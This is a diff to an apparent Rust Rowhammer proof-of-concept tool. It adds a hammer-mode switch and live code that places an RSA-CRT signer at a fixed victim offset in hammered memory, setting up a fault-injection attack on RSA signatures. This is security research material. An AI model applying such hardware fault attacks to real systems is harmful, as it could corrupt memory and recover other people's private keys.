@@ -1,3 +1,5 @@
+use std::ops::DerefMut;
+
 use bs_poc::memory::LinuxPageMap;
 use bs_poc::memory::Memory;
 use bs_poc::memory::VirtToPhysResolver;
@@ -7,6 +9,7 @@ use clap::Parser;
 use bs_poc::forge::Hammerer;
 
 use bs_poc::util::{BlacksmithConfig, MemConfiguration};
+use lazy_static::__Deref;
 use rand::rngs::StdRng;
 
 /// Search for a pattern in a file and display the lines that contain it.
@@ -21,6 +24,15 @@ struct CliArgs {
     /// The pattern ID to load from the JSON file
     #[clap(long = "pattern")]
     pattern: String,
+    /// The hammering mode to use. Set to memcheck for bit flip check or rsa for RSA-CRT attack
+    #[clap(long = "hammer-mode")]
+    hammer_mode: HammerMode,
+}
+
+#[derive(clap::ValueEnum, Clone, Debug)]
+enum HammerMode {
+    MemCheck,
+    Rsa,
 }
 
 #[macro_use]
@@ -58,17 +70,20 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     )?;
     info!("initialized hammerer");
 
-    //RSA-CRT
-    //let sig = rsa.sign(msg);
-    //let mut check = rsa.verify(msg, &sig);
-    /*let _init = |rsa: Option<RsaCrt>| {
-        if let Some(rsa) = rsa {
-            return rsa;
-        }
-        let mut rng = rand::thread_rng();
-        let mut r = RsaCrt::new(&memory, &mut rng).unwrap();
-        return r;
-    };*/
+    let rng = rand::thread_rng();
+    let victim_offset = 1337;
+    let mut rsa_p = RsaCrt::new(rng, &memory, victim_offset)?;
+    let rsa = rsa_p.deref_mut();
+    let msg = b"hello world";
+    let sig = rsa.sign(msg)?;
+    let check = rsa.verify(msg, &sig);
+    unsafe {
+        assert_eq!(
+            rsa as *const RsaCrt as usize,
+            memory.addr.add(victim_offset) as usize
+        )
+    };
+    info!("signature test: {}", check);
     info!("start hammering");
     let init = |_| {
         let seed = rand::random();
